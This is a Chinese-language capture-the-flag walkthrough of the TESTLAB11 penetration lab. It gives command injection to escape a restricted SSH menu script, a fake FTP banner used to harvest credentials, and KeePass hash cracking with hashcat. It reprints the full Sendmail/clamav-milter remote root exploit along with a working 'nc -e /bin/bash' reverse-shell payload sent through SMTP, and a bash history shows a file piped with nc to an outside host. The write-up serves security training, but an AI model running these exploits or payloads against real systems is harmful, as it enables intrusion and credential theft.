command="/opt/gh/gh.pl",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsySyf64qEIixzfjjL0Lcmo8cbtMhLgWhNYzByrV+vEPWgmvLCF3iZyO6LeMJl/Hn5pS5AtddYlicRMVjiuY5SBZnFlsXXGCXwFr7o6tzC4+n5QNDIHX5FESc6V2oVfEoS7Wizqwo1jmTOyfKeXgeQ3JWW1ClPL8keYsF/dbE3SnClGoSWjMpj9PdSdcjrziXMVHhqxATToY7JM8+ACQ9KipC5sWf7/SX/i8uokqSPKueZ4kI32gaI9xBkk7QGKq5/DBp23WnceLfIA6hHvCrKzHtJB/7pRE05BUHwnd+cp5wZS7kVl+9KY5MWMsrouWUGG0PPkwEIUEqebnPeDKKz
command="/opt/gh/gh.pl",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4Y5E8jqB0O63cSWuHLPIVzznUXZrH68c/dzx2UDE5Oh6eXh5NJOc9ZN+ago4Qaizs6uxLQmxmBTzshZbsenWyhKCdVsPFrcmh3AmCAC7ZiJ4eCVX7vse8Fo+6pFsyU2XONtXX9EIPG+BUPpvJDJnTuUpjL5XTqo6REenrvelyfVl3ocLqa6dYe6Qni7xw0cyK6s90yK6bAa32vmH1+oMDW5MCXurvKsHYozV8YuhSSEtgGRLw9tYPBwIvGcRrLSpcGHENj7B1ryF8Qp8f6cMWMkpyEwNWHtBIHpOwKIEOMZYl4uERIGSTXJxlPYp6ODM4lZtHKWyltw0PW/5k7eWD root@tl11-gw1

remote@tl11-192-168-11-1:~/.ssh$ cat known_hosts 
|1|/3LrQNj948Q+U+2sNdylotyYNUo=|tQ53LWvzDiKyc/YXjZxqwbDnFPo= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKRbSK4mnMNky9PsMxjsJNccfYOOA3fjkpHr8f5oOW/lLlM4QYHQ9pwRlDGtcBIL1C545KE1+yheA3eAFMjkcQ=
|1|2OW+4xzNJ+uofKoUL6TPbJrBxpA=|iPDR4hlBCVDoCc/KeIAnajHszrA= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKRbSK4mnMNky9PsMxjsJNccfYOOA3fjkpHr8f5oOW/lLlM4QYHQ9pwRlDGtcBIL1C545KE1+yheA3eAFMjkcQ=


remote@tl11-192-168-11-1:~/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTGsNZNdfOrXz6ZMXuGgAUj1k+hAoi1YRRv/WTyw/YjrnY+jcrLcsQYMOUrAiBkY8lujcIpJIDn17Zw6RJa8UgL2qdZAetauzq40MFtUtXFq+il1b831pe6E1r+kRLXyVGet+u3CYCBhhzurwjIzLWw7R2JcI26courBsaOm9jPXHXGpK7TXbzS47q7klnRNZK+xFYg5VvLKkyLPh3RR0z5dsZKHyAka2JkNqjzTAwh64R4d9OA0lr+IidpXIo6lXaXxLhvs6mTDSFhIY5QAmoWV9mggtTbI7X6JsI66kWgz8aKEd14WSIpnKsns/luckriBpFTz5HUfzWg7yS1Qv/ remote@tl11-192-168-11-1
remote@tl11-192-168-11-1:~/.ssh$ 

```

找到选择虚拟机时的报错文件夹脚本`/opt/gh/gh.pl`：

```perl
#!/usr/bin/perl

## USE
#use strict;
#use warnings;

## ENV
my $path = "/opt/gh/";
my $home = "/home/".`whoami`;
chomp($home);

## Go-go-go
while () {
# system("clear");
 print "########################################\n";
 print "Enter ServerName or Q for exit:\n";
 print "########################################\n";
 print "Srv1\n";
 print "Srv2\n";
 print "########################################\n";

 print "Enter VM name for connect: ";
 my $choice = <STDIN>;
 chomp ($choice);

 $choice =~ s/\.\.//g;
 $choice =~ s/(.*bash)|( sh|\/sh)//g;

 my $srv_conf	= $path.$choice;

 ## for right choice
 if ( "$choice" =~ /^Srv/ ) {
  ## Check that file exist
  if (( ! -e "$srv_conf") && ( "$choice" =~ /$home/ )) {
   my $srv_ip = `cat $srv_conf`;
   print "Server IP: $srv_ip";
   next; 
  }

  ## Get Srv IP from file
  my $srv_ip = `cat $srv_conf`;

  # Check Srv IP
  if ( "$srv_ip" =~ /^\d+\.\d+\.\d+\.\d+$/ ) {
 
   print "Connecting to server ...\n";

   ## SSH connect
   system("clear");

   ## and connect to server
   system("ssh -i /home/remote/.ssh/id_rsa -o StrictHostKeyChecking=no aengineer\@$srv_ip");
  }

 undef $choice;
 }
 ## for exit
 if (( "\U$choice" eq 'Q' ) || ( $choice eq 'quit') || ( $choice eq 'exit' )) { exit; }
}

system("logout");
exit;
```

脚本中的`ssh -i /home/remote/.ssh/id_rsa -o StrictHostKeyChecking=no aengineer\@$srv_ip`

选择虚拟机Srv2登陆后的用户名是`aengineer`,且IP为`192.168.10.1`:

![](/img/game/TESTLAB/TESTLAB11/192_168_10_1_aengineer.png)

即根据脚本的命令进行连接,登陆成功：

```bash
ssh -i /home/remote/.ssh/id_rsa -o StrictHostKeyChecking=no aengineer@192.168.10.1
```

![](/img/game/TESTLAB/TESTLAB11/192_168_10_1_aengineer_ssh登陆.png)

查看`192.168.10.1`的bash历史命令：

```bash
cd
tcpdump
/usr/sbin/tcpdump
/usr/sbin/tcpdump --help
/usr/sbin/tcpdump -i eth0 -c 2
which gcc
which ruby
ruby -v
exit
cd /dev/shm/
wget 192.168.11.3/admin
env
set http_proxy=""
wget 192.168.11.3/admin
export http_proxy=""
wget 192.168.11.3/admin
wget 192.168.11.3/_admin/admin
wget 192.168.11.3/_admin/admin/
ruby -v 
ncat -klvp 7777
ncat -klvp 8888
ncat -klvp 9999
cd
exit
cd /dev/shm
ls
perl ngxbrt.pl 
perl ngxbrt.pl 192.168.11.3 80 192.168.10.1 8888
exit
ncat -klvp 8888
exit
cd /dev/shm
perl ngxbrt.pl 192.168.11.3 80 192.168.10.1 8888
exit
cd /tmp
ls -la
cat ~/.bash_history 
clear
nc -nvlp 2020
/usr/sbin/tcpdump -i eth0 -A '' -w /var/tmp/dump.pcap
ls
exit
ls -la
nc -nvvlp 1234
exit
nmap -v -n -p- 192.168.10.2 -sV
nmap -v -n -p- 192.168.10.2 -sV -Pn
nmap -v -n -p- 192.168.10.2 -sV -Pn -T4
/usr/sbin/tcpdump 'src 192.168.10.2'
/usr/sbin/tcpdump 'src 192.168.10.2 || dst 192.168.10.2'
/usr/sbin/tcpdump 'src 192.168.10.5 || dst 192.168.10.5'
telnet 192.168.11.5
telnet 192.168.11.5 25
nc -nvlp 2020
sudo -l
ncat -klvp 8888
cd /dev/shm
cat ngxbrt.pl | nc 172.16.0.16 10100
ncat -klvp 8888
sudo -l
sudo tcpdump -A -i eth0 -s 1500 -c 1000 port not 22 and host not 192.168.11.1 and port not 53 and host not 92.168.56.2 and not arp and port not 123
ls
```

根据命令查找关键点：

- `/dev/shm/ngxbrt.pl`不存在
- `/usr/sbin/tcpdump -i eth0 -A '' -w /var/tmp/dump.pcap`中的`/var/tmp/dump.pcap`存在，可以分析
- `nc -nvlp 2020`，和之前`192.168.12.2`中的todo.txt内容有相似之处

![todo.txt](/img/game/TESTLAB/TESTLAB11/192_168_12_2_old_omp_todo_txt.png)

图中显示的是三分钟进行一次任务执行脚本，直接进行`nc -nvlp 2020`见监听，但是失败：

![](/img/game/TESTLAB/TESTLAB11/192_168_10_1_nc_监听失败.png)

连接关闭的原因是`192.168.11.4`上有一个FTP脚本在进行周期性的连接(todo.txt的计划任务列表),而`192.168.10.1`上现在没有FTP服务，`192.168.10.1`不能对服务请求做出响应，监听失败。

可以根据[FTP服务器返回码列表](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)伪造`192.168.10.1`的FTP服务响应banner(问候语):

```bash
220  Service ready for new user.

331  User name okay, need password.
```

使用python发包：

```bash
python -c 'print "220 Welcome to FTP Service\r\n331 SPECIFY THE PASSWORD"' | nc -nlvp 2020
```

过了几分钟得到，即得到Connect的flag为`Con_con_con`：

```bash
USER ConnectToken
PASS Con_con_con
```

![](/img/game/TESTLAB/TESTLAB11/192_168_10_1_nc_sucessed.png)

### Cloud Token

对于tcpdump的包，使用python开启简易web服务器或者直接使用`scp -i remote2.key aengineer@192.168.10.1:/var/tmp/dump.pcap dump.pcap`下载tcpdump的包，进行分析：

![](/img/game/TESTLAB/TESTLAB11/192_168_10_3_wireshark_dump_pcap.png)

得到了`http://192.168.10.3/index.php/login`的登陆用户为`user`,密码为`4E3j3C3v`

![](/img/game/TESTLAB/TESTLAB11/192_168_10_3_web_登陆.png)

登陆后下载`kdbx`文件，[KeePass数据库文件]()

![](/img/game/TESTLAB/TESTLAB11/192_168_10_3_web_下载kdbx.png)


使用[KeePass2John](https://www.rubydevices.com.au/blog/how-to-hack-keepass)提取密码hash，将密码hash保存在文件中：

```bash
keepass2john my_store.kdbx
```

![](/img/game/TESTLAB/TESTLAB11/kdbx文件hash.png)

参照[如何使用Hashcat破解KeePass密码 ](https://www.rubydevices.com.au/blog/how-to-hack-keepass)使用hashcat破解hash：

```bash
hashcat -a 0 -m 13400 my_store_hash /opt/SecLists/rockyou.txt --force
```

破解出来为`reajel`

在kali中`sudo apt-get install keepassx`安装keepassx，然后使用keepassx打开之前下载kdbx数据库文件，就能得到Cloud的key：

![](/img/game/TESTLAB/TESTLAB11/keepassx_token.png)

或者将文件上传到https://app.keeweb.info/，并输入hashcat解出的密码就能得到Cloud的flag，就是`Sky_is_Over!`

![](/img/game/TESTLAB/TESTLAB11/my_store_token.png)

### Clamav Token

`ssh -i remote.key remote@192.168.11.1`连接192.168.11.1，并使用命令注入进行会话切换到`192.168.11.1`:

```bash
#连接192.168.11.1
ssh -i remote.key remote@192.168.11.1
#命令注入，绕过脚本执行，切换会话到192.168.11.1
Srv3;dash 1>&2
#dash切换为bash
bash
#nmap扫描
nmap -T4 -sV -Pn -n 192.168.11.1-5
```

![](/img/game/TESTLAB/TESTLAB11/nmap扫描192_168_11_1_5.png)

查看到192.168.11.5运行着Sendmail，并用searchsploit搜索sendmail的漏洞。

提交flag的地方写着clamav，自然联想到该sendmail也有clamav(ClamAV在邮件服务器上作为服务器端的电子邮件病毒扫描器).在exploit DB上有[sendmail与clamav-milter <0.91.2 - 远程命令执行](https://www.exploit-db.com/exploits/4761)漏洞

```perl
### black-hole.pl
### Sendmail w/ clamav-milter Remote Root Exploit
### Copyright (c) 2007 Eliteboy
########################################################
use IO::Socket;
 
print "Sendmail w/ clamav-milter Remote Root Exploit\n";
print "Copyright (C) 2007 Eliteboy\n";
 
if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;}
 
print "Attacking $ARGV[0]...\n";
 
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                              PeerPort => '25',
                              Proto    => 'tcp');
 
print $sock "ehlo you\r\n";
print $sock "mail from: <>\r\n";
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
print $sock "data\r\n.\r\nquit\r\n";
 
while (<$sock>) {
        print;
}
 
# milw0rm.com [2007-12-21]
```

在阅读上面exp之后，对目标机器`192.168.11.5`进行漏洞测试。

![](/img/game/TESTLAB/TESTLAB11/192_168_11_5_25_nc_banner.png)

并在`192.168.10.1`上进行12234端口监听，在目标机器上发送返回shell的邮件：（多次实验，只有192.168.10.1能够反弹shell，该机器可能为运行着防火墙等重要的管理设备）

```bash
#测试漏洞
nc 192.168.11.5 25

ehlo you

# 端口监听
nc -nvlp 12234

#反弹shell
mail from:<>
rcpt to:<nobody+"|/bin/nc -e /bin/bash 192.168.10.1 12234"@localhost>
data
.

# 在反弹的shell处获得伪终端shell
python -c 'import pty; pty.spawn("/bin/sh")'

```


![](/img/game/TESTLAB/TESTLAB11/192_168_11_5_nc_返回shell.png)

```bash
root@kali:~/Desktop/testlab# nc 192.168.11.5 25
220 tl11-192-168-11-5.mail-dev ESMTP Sendmail 8.14.4/8.14.4/Debian-8+deb8u2; Thu, 28 Jun 2018 12:21:55 +0300; (No UCE/UBE) logging access from: [192.168.11.254](TEMP)-[192.168.11.254]
ehlo you
250-tl11-192-168-11-5.mail-dev Hello [192.168.11.254], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-AUTH DIGEST-MD5 CRAM-MD5
250-DELIVERBY
250 HELP
mail from:<>
250 2.1.0 <>... Sender ok
rcpt to:<nobody+"|/bin/nc -e /bin/bash 192.168.10.1 12234"@localhost>
250 2.1.5 <nobody+"|/bin/nc -e /bin/bash 192.168.10.1 12234"@localhost>... Recipient ok
data
354 Enter mail, end with "." on a line by itself
.
451 4.3.2 Please try again later
root@kali:~/Desktop/testlab# 

```


得出ClamAV的flag是`Anti_Virus_not_a_Virus`
